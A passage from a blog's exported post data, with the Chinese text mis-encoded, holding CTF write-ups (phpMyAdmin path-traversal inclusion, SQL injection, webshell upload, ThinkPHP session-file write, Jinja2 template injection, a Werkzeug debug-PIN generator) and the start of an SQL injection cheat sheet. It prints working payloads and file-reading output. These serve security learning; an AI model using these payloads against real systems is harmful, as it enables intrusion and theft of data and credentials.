å¯†äº†,æ‰€ä»¥ç”¨md5è§£å¯†ä¸€ä¸‹,å¾—åˆ°å¯†ç ç™»å½•ç³»ç»Ÿ,æ ¹æ®æç¤ºæ‰¾åˆ°key åå°ç™»å½• æ‰“å¼€å‘ç°é™æ­¢è®¿é—®,ä½†æ˜¯å“åº”ç ä¸º200è¯´æ˜å¯èƒ½å› ä¸ºæ˜¯åå°ç™»å½•ç³»ç»Ÿåšäº†é™åˆ¶,æ”¹xffå¤´åé¡ºåˆ©è®¿é—® ä½¿ç”¨ä¸‡èƒ½å¯†ç ç™»å½•,æˆåŠŸè·å–key phpmyadmin æ ¹ç›®å½•ä¸‹é¢çš„robots.txtæŒ‡æ˜äº†keyçš„ä½ç½® é€šè¿‡å¢åŠ å¸¸ç”¨æ–‡ä»¶åphpmyadmin,æˆåŠŸæ‰¾åˆ°ç™»å½•åœ°å€ ç”¨å¼±å£ä»¤root/rootç™»å½•å,å…ˆå°è¯•åŒ…å«/etc/passwdåˆ¤æ–­ç›®å½•å±‚çº§ 1http:&#x2F;&#x2F;114.215.40.251:5002&#x2F;phpmyadmin&#x2F;index.php?a&#x3D;phpinfo();&amp;target&#x3D;export.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd ç„¶åå†å»åŒ…å«key 1http:&#x2F;&#x2F;114.215.40.251:5002&#x2F;phpmyadmin&#x2F;index.php?a&#x3D;phpinfo();&amp;target&#x3D;export.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;opt&#x2F;key.txt","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"WP","slug":"WP","permalink":"https://yanmymickey.github.io/tags/WP/"}]},{"title":"GYCTFâ€”â€”2020iæ˜¥ç§‹æ–°æ˜¥æˆ˜ç–«CTFâ€”â€”ç½‘ç»œå®‰å…¨å…¬ç›Šèµ›","date":"2020-02-24T16:00:00.000Z","path":"2020/02/25/CTF_WP/gyctf_wp/","text":"GYCTFâ€”â€”2020iæ˜¥ç§‹æ–°æ˜¥æˆ˜ç–«CTFâ€”â€”ç½‘ç»œå®‰å…¨å…¬ç›Šèµ›MISCcode_in_morseä¸‹è½½ä¸‹æ¥æ˜¯å‹ç¼©åŒ…,è§£å‹æ˜¯æµé‡åŒ…,ç”¨wiresharkåˆ†æ,è¿‡æ»¤http å‘ç°ä¸Šä¼ æ–‡ä»¶çš„upload.php,è·Ÿè¸ªæµé‡Œé¢æ˜¯morseç ,morseè§£ç æ˜¯ä¸€å †å­—æ¯åŠ æ•°å­—,å¾ˆåƒbase64,ä½†æ˜¯å…¶ä¸­æ²¡æœ‰1æ²¡æœ‰8æ•°å­—åªè¦2-7,å› ä¸ºä¸Šä¼ çš„æ˜¯æ–‡ä»¶,base32è§£ç æˆæ–‡ä»¶,ä¸‹é¢è¿™ä¸ªå·¥å…·è§£ç å¾—åˆ°ä¸€ä¸ªå›¾ç‰‡ Base32 Decode File å›¾ç‰‡ä¸çŸ¥é“æ˜¯ä»€ä¹ˆ,ç”¨googleè¯†å›¾æœç´¢åå‘ç°ä¸€ç§å¾ˆç±»ä¼¼çš„æ¡å½¢ç æ ¼å¼PDF417,éšè®¤ä¸ºæ˜¯è¯¥ç§æ¡å½¢ç ,ç”¨ä¸€ä¸‹å·¥å…·è¿›è¡Œè¯†åˆ«,è¯†åˆ«å‡ºä¸€ä¸ªç½‘ç«™,ç½‘ç«™æ˜¯ä¸€å¼ å›¾ç‰‡ æ¡å½¢ç äºŒç»´ç è¯†åˆ« Stegsolveåˆ†ææ–‡ä»¶æ ¼å¼å‡ºç°F5,æ˜¯F5éšå†™,ç”¨GitHubçš„F5éšå†™å·¥å…·è§£å¯†,æ²¡æœ‰å¯†ç ,å¾—åˆ°flag WEBç®€å•çš„æ‹›è˜ç³»ç»Ÿè¿™ä¸ªé¢˜æ‹¿åˆ°æ‰‹å…ˆæ˜¯ä¸€ä¸ªç™»å½•æ¡†,å°è¯•äº†ä¸‡èƒ½å¯†ç ä»€ä¹ˆçš„å‘ç°æ€»æ˜¯æœªçŸ¥é”™è¯¯,ä»¥ä¸ºæ˜¯æˆ‘çš„åŸå› ,ç»ç¾¤é‡Œå¤§ä½¬æé†’å®¹å™¨ä¸ç¨³å®š,é‡æ–°ä¸‹å‘,å‘ç°ä¸‡èƒ½å¯†ç ç™»å½•æˆåŠŸ æµè§ˆå„ä¸ªé¡µé¢å‘ç°AdminPageæœ‰ä¸€ä¸ªserach for keyçš„æŸ¥è¯¢æ¡† å°è¯•sqlæ³¨å…¥,æœ‰å›æ˜¾,æœ‰é”™è¯¯æç¤º,ç›´æ¥æœ‰å›æ˜¾çš„sqlæ³¨å…¥ä¸€å¥—,å¾—flag 123456789101112131415161718&#39; or 1&#x3D;1 order by 5#&#39; or 1&#x3D;1 order by 6##5æœ‰å›æ˜¾,6æ²¡æœ‰&#39; or 1&#x3D;1 union select 1,2,3,4,5##adminå˜æˆ2,è¾“å‡ºä½ç½®åœ¨2&#39; or 1&#x3D;1 union select 1,group_concat(database()),3,4,5##æŸ¥åº“&#39; or 1&#x3D;1 union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema&#x3D;database()##æŸ¥è¡¨&#39; or 1&#x3D;1 union select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;flag&#39;##æŸ¥å­—æ®µ&#39; or 1&#x3D;1 union select 1,group_concat(flaaag),3,4,5 from flag##æŸ¥å†…å®¹ equploadè¿™ä¸ªé¢˜ä¹Ÿå¾ˆç®€å•,ç›´æ¥ä¸Šä¼ ä¸€å¥è¯getshell,è¯»å–æ ¹ç›®å½•ä¸‹é¢çš„flag (æ²¡æœ‰ä»»ä½•è¿‡æ»¤?ä¸çŸ¥é“æ˜¯ä¸æ˜¯ä¸»åŠæ–¹çš„å¤±è¯¯,æ— ä»å¾—çŸ¥) blacklistè¿‡æ»¤äº†set|prepare|alter|rename|select|update|delete|drop|insert|where| ä½†æ˜¯mysqlè¿˜æœ‰ä¸€ç§æŸ¥è¯¢å§¿åŠ¿ 1234561&#39;;show tables;#æŸ¥è¡¨1&#39;;desc FlagHere;#æŸ¥å­—æ®µ1&#39;;handler FlagHere open;handler FlagHere read first;handler FlagHere close;##è¯»å–å†…å®¹ easy_thinkingè¿™ä¸ªåˆ©ç”¨çš„æ˜¯ThinkPHP&lt;6.0.2çš„ä¸€ä¸ªä»»æ„æ–‡ä»¶å†…å®¹å†™å…¥è¦†ç›–æ¼æ´ å¯ä»¥é€šè¿‡æ§åˆ¶cookiesä¸­çš„PHPSESSIONIDå­—æ®µå†…å®¹æ¥è¾¾åˆ°æ§åˆ¶sessionç›®å½•ä¸‹ç”Ÿæˆçš„æ–‡ä»¶å è¯¦æƒ…å¯ä»¥æŸ¥çœ‹ ThinkPHP&lt;6.0.2ä»»æ„æ–‡ä»¶å†…å®¹å†™å…¥/è¦†ç›– ç½‘ç«™ç›®å½•ä¸‹æœ‰www.zip.ä¸‹è½½ä¸‹æ¥æŸ¥çœ‹æ§åˆ¶å™¨æ–‡ä»¶,å‘ç°sessionæ–‡ä»¶å†…å®¹å­˜å‚¨çš„æ˜¯æŸ¥è¯¢é¡µçš„keyå€¼ æ³¨å†Œ,ç™»å½•,æ„é€ æŸ¥è¯¢é¡µé¢çš„keyä¸ºä¸€å¥è¯æœ¨é©¬,cookiesä¸‹é¢çš„PHPSESSIONIDå­—æ®µPHPSESSID=1234567890123456789012345678.php ç„¶åè®¿é—®ç”¨èšå‰‘é“¾æ¥ 1http:&#x2F;&#x2F;123.57.212.112:7891&#x2F;runtime&#x2F;session&#x2F;sess_1234567890123456789012345678.php getshell æŸ¥çœ‹php.iniæ˜¯ç¦ç”¨äº†ç³»ç»Ÿæ‰§è¡Œå‡½æ•°çš„,è¿™æ—¶éœ€è¦ä½¿ç”¨èšå‰‘çš„ç»•è¿‡disable_functionçš„æ’ä»¶é€‰æ‹©æ¨¡å¼è¿›è¡Œé“¾æ¥,æˆåŠŸç»•è¿‡disable_functionåå³å¯æ‰§è¡Œæ ¹ç›®å½•ä¸‹é¢readflag flaskappåœ¨decodeäºšç›®è¾“å…¥123å‘ç°debugé¡µé¢,åˆ†æé¡µé¢,å¾—å‡ºé¡µé¢è·¯å¾„ å¾—å‡ºformateæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´,é…åˆå‘ç°jinja2æ¨¡æ¿æ³¨å…¥ å°è¯•å»è·å–6ä¸ªå˜é‡å€¼ 1234567891011121314151617181920212223242526272829303132333435363738394041424344username # ç”¨æˆ·åmodname # flask.appgetattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;)) # Flaskgetattr(mod, &#39;__file__&#39;, None) # flaskç›®å½•ä¸‹çš„ä¸€ä¸ªapp.pyçš„ç»å¯¹è·¯å¾„uuid.getnode() # macåœ°å€åè¿›åˆ¶get_machine_id() # &#x2F;etc&#x2F;machine-id&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;etc&#x2F;passwd&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignL2V0Yy9wYXNzd2QnLCAncicpLnJlYWQoKSB9fXslIGVuZGlmICV9eyUgZW5kZm9yICV9ç»“æœ ï¼š root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bashdaemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologinbin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologinsys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologinsync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;syncgames:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologinman:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologinlp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologinmail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologinnews:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologinuucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologinproxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologinwww-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologinbackup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologinlist:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologinirc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologingnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologinnobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin_apt:x:100:65534::&#x2F;nonexistent:&#x2F;bin&#x2F;falseflaskweb:x:1000:1000::&#x2F;home&#x2F;flaskweb:&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignL3N5cy9jbGFzcy9uZXQvZXRoMC9hZGRyZXNzJywgJ3InKS5yZWFkKCkgfX17JSBlbmRpZiAlfXslIGVuZGZvciAlfSAgMACåœ°å€:02:42:ac:12:00:0aMACåœ°å€åè¿›åˆ¶:2485377957898&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123;c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;proc&#x2F;self&#x2F;cgroup&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignL3Byb2Mvc2VsZi9jZ3JvdXAnLCAncicpLnJlYWQoKSB9fXslIGVuZGlmICV9eyUgZW5kZm9yICV912:freezer:&#x2F;docker&#x2F;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 11:cpuset:&#x2F;docker&#x2F;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 10:cpu,cpuacct:&#x2F;docker&#x2F;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 9:devices:&#x2F;docker&#x2F;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 8:hugetlb:&#x2F;docker&#x2F;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 7:blkio:&#x2F;docker&#x2F;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 6:memory:&#x2F;docker&#x2F;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 5:pids:&#x2F;docker&#x2F;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 4:net_cls,net_prio:&#x2F;docker&#x2F;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 3:rdma:&#x2F; 2:perf_event:&#x2F;docker&#x2F;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 1:name&#x3D;systemd:&#x2F;docker&#x2F;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 0::&#x2F;system.slice&#x2F;containerd.service&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;etc&#x2F;machine-id&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignL2V0Yy9tYWNoaW5lLWlkJywgJ3InKS5yZWFkKCkgfX17JSBlbmRpZiAlfXslIGVuZGZvciAlfQ&#x3D;&#x3D;81ef01dec0f0eb6d6c0f3752b487b10e åˆ©ç”¨è·å–åˆ°çš„ä¿¡æ¯çˆ†ç ´pin 123456789101112131415161718192021222324252627282930313233343536373839404142import hashlibfrom itertools import chainprobably_public_bits &#x3D; [ &#39;flaskweb&#39;,# username &#39;flask.app&#39;,# modname &#39;Flask&#39;,# getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;)) &#39;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;site-packages&#x2F;flask&#x2F;app.py&#39; # getattr(mod, &#39;__file__&#39;, None),]private_bits &#x3D; [ &#39;2485377957898&#39;,# str(uuid.getnode()), &#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address &#39;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320&#39; # get_machine_id(), &#x2F;etc&#x2F;machine-id]h &#x3D; hashlib.md5()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit &#x3D; bit.encode(&#39;utf-8&#39;) h.update(bit)h.update(b&#39;cookiesalt&#39;)cookie_name &#x3D; &#39;__wzd&#39; + h.hexdigest()[:20]num &#x3D; Noneif num is None: h.update(b&#39;pinsalt&#39;) num &#x3D; (&#39;%09d&#39; % int(h.hexdigest(), 16))[:9]rv &#x3D;Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size &#x3D;&#x3D; 0: rv &#x3D; &#39;-&#39;.join(num[x:x + group_size].rjust(group_size, &#39;0&#39;) for x in range(0, len(num), group_size)) break else: rv &#x3D; numprint(rv) åˆ©ç”¨pinç è¿›å…¥debugç•Œé¢ è¯»å–flag 123import osos.listdir(&#39;&#x2F;&#39;)open(&#39;this_is_the_flag.txt&#39;,&#39;r&#39;).read()","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"WP","slug":"WP","permalink":"https://yanmymickey.github.io/tags/WP/"}]},{"title":"sqlæ³¨å…¥æ€»ç»“","date":"2020-02-10T16:00:00.000Z","path":"2020/02/11/CTF/sqlæ³¨å…¥æ€»ç»“/","text":"sqlæ³¨å…¥æ€»ç»“0x00å‰è¨€ SQLæ³¨å…¥æœ€ä¸»è¦çš„æ˜¯åˆ¤æ–­æ³¨å…¥ç›®æ ‡çš„SQLè¯­å¥å’Œå­—ç¬¦å¤„ç†è¿‡ç¨‹,æ ¹æ®åˆ¤æ–­ç»“æœé€‰æ‹©åˆé€‚çš„æ³¨å…¥æ–¹æ³•å’ŒæŠ€å·§è¿›è¡Œè„±åº“ å¸¸è§SQLæ³¨å…¥ç±»å‹æœ‰: æŒ‰å˜é‡ç±»å‹ å­—ç¬¦å‹ æ•°å­—å‹ æŒ‰HTTPæäº¤æ–¹å¼ GET POST Cookies headä¸­ User-Agent Referer æŒ‰ä»æœåŠ¡å™¨æ¥æ”¶åˆ°çš„å“åº” æ˜¾é”™æ³¨å…¥(æ²¡æœ‰å…³é—­é”™è¯¯æ˜¾ç¤º,ä¼šæ˜¾ç¤ºmysql error) ç›²æ³¨(åªä¼šå‘Šè¯‰ä½ sqlè¯­å¥çš„æ‰§è¡Œç»“æœtrue or false,ä¸ä¼šå°†sqlè¯­å¥æ‰§è¡Œç»“æœå±•ç¤ºç»™ä½ ) åŸºäºæ—¶é—´ åŸºäºbool åŸºäºæŠ¥é”™ å †å æŸ¥è¯¢æ³¨å…¥ åŸºäºç¨‹åº¦å’Œé¡ºåºçš„æ³¨å…¥ ä¸€é˜¶æ³¨å…¥ äºŒé˜¶æ³¨å…¥ 0x01å¸¸ç”¨è¯­å¥ç”¨äºå°è¯•Ps:â€“+å¯ä»¥ç”¨#æ›¿æ¢ï¼Œurl æäº¤è¿‡ç¨‹ä¸­ url ç¼–ç åçš„#ä¸º%23 or 1=1â€“+ â€˜ or 1=1â€“+ â€œ or 1=1â€“+ ) or 1=1â€“+ â€˜)or 1=1â€“+ â€œ) or 1=1â€“+ â€œ))or 1=1â€“+ æ€»çš„æ¥è¯´,æ€è·¯ä¸ºé—­åˆå‰é¢æœ¬æ¥sqlè¯­å¥ä¸­çš„ç¬¦å·,æ³¨é‡Šæ‰åé¢çš„ç¬¦å· ç”¨äºæŸ¥è¯¢ ï¼ˆ1ï¼‰è·å–å­—æ®µæ•° 1order by n &#x2F;*é€šè¿‡ä¸æ–­å°è¯•æ”¹å˜nçš„å€¼æ¥è§‚å¯Ÿé¡µé¢ååº”ç¡®å®šå­—æ®µæ•°*&#x2F; ï¼ˆ2ï¼‰ è·å–ç³»ç»Ÿä¸­æ‰€æœ‰æ•°æ®åº“å åœ¨MySQL &gt;5.0ä¸­ï¼Œæ•°æ®åº“åå­˜æ”¾åœ¨information_schemaæ•°æ®åº“ä¸‹schemataè¡¨schema_nameå­—æ®µä¸­ 1select null,null,group_concat(schema_name) from information_schema.schemata ï¼ˆ3ï¼‰è·å–å½“å‰æ•°æ®åº“å 1select null,null,...,database() ï¼ˆ4ï¼‰è·å–æ•°æ®åº“ä¸­çš„è¡¨ 1select null,null,...,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() æˆ– 1select null,null,...,table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1 ï¼ˆ5ï¼‰è·å–è¡¨ä¸­çš„å­—æ®µ è¿™é‡Œå‡è®¾å·²ç»è·å–åˆ°è¡¨åä¸ºuser 1select null,null,...,group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39; ï¼ˆ6ï¼‰è·å–å„ä¸ªå­—æ®µå€¼ è¿™é‡Œå‡è®¾å·²ç»è·å–åˆ°è¡¨åä¸ºuserï¼Œä¸”å­—æ®µä¸ºusernameå’Œpassword 1select null,group_concat(username,password) from users 0x02æ³¨å…¥ç±»å‹æŒ‰å˜é‡ç±»å‹æ•°å­—å‹1id&#x3D;1 union select database() å­—ç¬¦å‹1234id&#x3D;1&#39; union select database()id&#x3D;1&quot; union select database()id&#x3D;1&#39;) union select database()id&#x3D;1&quot;) union select database() æŒ‰HTTPæäº¤æ–¹å¼GETå‚è€ƒä¸Šæ–¹æŒ‰å˜é‡ç±»å‹ POSTä¸€èˆ¬ä¸ºç™»å½•æ¡†,ç•™è¨€æ¿ç­‰ç­‰,ä»¥è¡¨å•å½¢å¼æäº¤çš„å­—æ®µ åç«¯æ— æ•°æ®å¤„ç†å‹æ— æ•°æ®å¤„ç†,æ—¢sqlè¯­å¥å’Œå˜é‡ç›´æ¥æ‹¼æ¥,å½¢å¼å‚è€ƒGET,#ä¸éœ€è¦urlç¼–ç  åç«¯æœ‰æ•°æ®å¤„ç†å‹å¸¸è§æ•°æ®å¤„ç† æ•°æ®å¤„ç†å‡½æ•° preg_replace() å½“ä»£ç ä¸ºpreg_replace(&#39;/or/i&#39;,&quot;&quot;, $id)æ—¶,å¯ä»¥åˆ©ç”¨åŒå†™è¿‡æ»¤å­—ç¬¦,å› ä¸ºæ›¿æ¢ä¸ºç©º,è€Œä¸”åªæ£€æµ‹ä¸€æ¬¡ ä¾‹å¦‚ç»•è¿‡ä¸Šè¿°åªéœ€å°†orå†™å‡ºoorrå³å¯,æ›¿æ¢æ‰ä¸­é—´çš„orä¹‹å,å‰©ä¸‹çš„å­—æ®µå°±å˜æˆäº†or å¦‚æœåŒ¹é…ä¸­æ²¡æœ‰ç»Ÿè®¡å¤§å°å†™,è¿˜å¯ä»¥åˆ©ç”¨å˜æ¢è¯­å¥ä¸­å­—æ¯çš„å¤§å°å†™è¿›è¡Œç»•è¿‡ addslashes() å­—ç¬¦ç¼–ç é—®é¢˜å¯¼è‡´ç»•è¿‡ è®¾ç½®æ•°æ®åº“å­—ç¬¦ä¸ºgbkå¯¼è‡´å®½å­—èŠ‚æ³¨å…¥ ä½¿ç”¨icon,mb_convert_encodingè½¬æ¢å­—ç¬¦ç¼–ç å‡½æ•°å¯¼è‡´å®½å­—èŠ‚æ³¨å…¥ ç¼–ç è§£ç å¯¼è‡´çš„ç»•è¿‡ urlè§£ç å¯¼è‡´ç»•è¿‡addslashes base64è§£ç å¯¼è‡´ç»•è¿‡addslashes jsonç¼–ç å¯¼è‡´ç»•è¿‡addslashes ä¸€äº›ç‰¹æ®Šæƒ…å†µå¯¼è‡´çš„ç»•è¿‡ æ²¡æœ‰ä½¿ç”¨å¼•å·ä¿æŠ¤å­—ç¬¦ä¸²ï¼Œç›´æ¥æ— è§†addslashes ä½¿ç”¨äº†stripslashes å­—ç¬¦æ›¿æ¢å¯¼è‡´çš„ç»•è¿‡addslashes å®½å­—èŠ‚æ³¨å…¥1ã€%df åƒæ‰ \\ å…·ä½“çš„åŸå› æ˜¯ urlencode(â€˜) = %5c%27ï¼Œæˆ‘ä»¬åœ¨%5c%27 å‰é¢æ·»åŠ %dfï¼Œå½¢æˆ%df%5c%27ï¼Œ mysql åœ¨ GBK ç¼–ç æ–¹å¼çš„æ—¶å€™ä¼šå°†ä¸¤ä¸ªå­—èŠ‚å½“åšä¸€ä¸ªæ±‰å­—ï¼Œ æ­¤æ—¶%df%5c å°±æ˜¯ä¸€ä¸ªæ±‰å­—ï¼Œ %27 åˆ™ä½œä¸ºä¸€ä¸ªå•ç‹¬çš„ç¬¦å·åœ¨å¤–é¢ï¼Œ è¿™æ ·å°±è¾¾åˆ°äº†æˆ‘ä»¬çš„ç›®çš„ã€‚2ã€å°† \\â€™ ä¸­çš„ \\ è¿‡æ»¤æ‰ï¼Œ ä¾‹å¦‚å¯ä»¥æ„é€  %**%5c%5c%27 çš„æƒ…å†µï¼Œ åé¢çš„%5c ä¼šè¢«å‰é¢çš„%5cç»™æ³¨é‡Šæ‰ã€‚è¿™ä¹Ÿæ˜¯ bypass çš„ä¸€ç§æ–¹æ³• 3ã€å°†utf-8çš„ â€˜ è½¬æ¢ä¸º ï¿½â€™ ï¿½â€™or 1=1 limit 1,1# è¿˜æœ‰å¾ˆå¤šç»•è¿‡å¼•å·ã€åŒå¼•å·ã€é€—å·ã€ç©ºæ ¼çš„æ–¹æ³• Cookieså½“phpä¼šé€šè¿‡cookiesä¸­usernameç­‰å­—æ®µè¿›è¡ŒæŸ¥è¯¢æ—¶å¯èƒ½å­˜åœ¨æ³¨å…¥,ä¸POSTåŸºæœ¬ä¸€è‡´,åªæ˜¯æ³¨å…¥ä½ç½®çš„åŒºåˆ« headä¸­ User-Agent Referer XFF(X-Forward-For) 1X-Forward-Forï¼š127.0.0.1&#39; select 1,2,user() å½“phpä¼šå°†ip,User-Agent,refererç­‰è¯·æ±‚å¤´ä¿¡æ¯è¿›è¡Œå­˜å‚¨æ•°æ®åº“æ—¶,å¯èƒ½å­˜åœ¨æ³¨å…¥,ä¸POSTåŸºæœ¬ä¸€è‡´,åªæ˜¯æ³¨å…¥ä½ç½®çš„åŒºåˆ«,å¯ä»¥é€šè¿‡æµè§ˆå™¨æ’ä»¶ã€æµè§ˆå™¨ç¼–è¾‘å’Œé‡å‘çš„åŠŸèƒ½ã€æŠ“åŒ…ç­‰å¯¹è¯·æ±‚å¤´è¿›è¡Œæ›´æ”¹ æŒ‰ä»æœåŠ¡å™¨æ¥æ”¶åˆ°çš„å“åº”æ˜¾é”™æ³¨å…¥ç”±äºphpä»£ç ä¼šå°†mysqlä¸­çš„é”™è¯¯å±•ç¤ºåœ¨å‰ç«¯ï¼Œæ‰€ä»¥å¾ˆå¥½åˆ¤æ–­ï¼Œå‚è€ƒä¸Šæ–¹GETç­‰ ç›²æ³¨åŸºäºbool â–²left(database(),1)&gt;â€™sâ€™ //left()å‡½æ•° Explain: database()æ˜¾ç¤ºæ•°æ®åº“åç§° left(a,b)ä»å·¦ä¾§æˆªå– a çš„å‰ b ä½ â–²ascii(substr((select table_name information_schema.tables where tables_schema =database()limit 0,1),1,1))=101 â€“+ //substr()å‡½æ•°ï¼Œascii()å‡½æ•° Explainï¼š substr(a,b,c)ä» b ä½ç½®å¼€å§‹ï¼Œæˆªå–å­—ç¬¦ä¸² a çš„ c é•¿åº¦ã€‚ ascii()å°†æŸä¸ªå­—ç¬¦è½¬æ¢ä¸º ascii å€¼ ascii(substr((select database()),1,1))=98ï¼ˆæ”¹å˜ç¬¬ä¸€ä¸ª 1 å’Œ98çš„å€¼ç›¸å½“äºå°†åå­—ä¸€ä¸ªä¸ªå’Œå­—æ¯æ¯”è¾ƒï¼Œä»è€Œå¾—åˆ°å®Œæ•´åå­—ï¼‰ ä¹Ÿå¯ä»¥ç”¨äºŒåˆ†æ³•å’Œ&gt;=â€™aâ€™,between andç­‰æ¥åˆ¤æ–­ â–²ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))&gt;98%23 //ORD()å‡½æ•°ï¼ŒMID()å‡½æ•° Explainï¼š mid(a,b,c)ä»ä½ç½® b å¼€å§‹ï¼Œæˆªå– a å­—ç¬¦ä¸²çš„ c ä½ Ord()å‡½æ•°åŒ ascii()ï¼Œå°†å­—ç¬¦è½¬ä¸º ascii å€¼ â–²regexp æ­£åˆ™æ³¨å…¥ æ­£åˆ™æ³¨å…¥ä»‹ç»ï¼š http://www.cnblogs.com/lcamry/articles/5717442.html ç”¨æ³•ä»‹ç»ï¼šselect user() regexp â€˜^[a-z]â€™; Explainï¼š æ­£åˆ™è¡¨è¾¾å¼çš„ç”¨æ³•ï¼Œuser()ç»“æœä¸º rootï¼Œregexp ä¸ºåŒ¹é… root çš„æ­£åˆ™è¡¨è¾¾å¼ã€‚ç¬¬äºŒä½å¯ä»¥ç”¨ select user() regexp 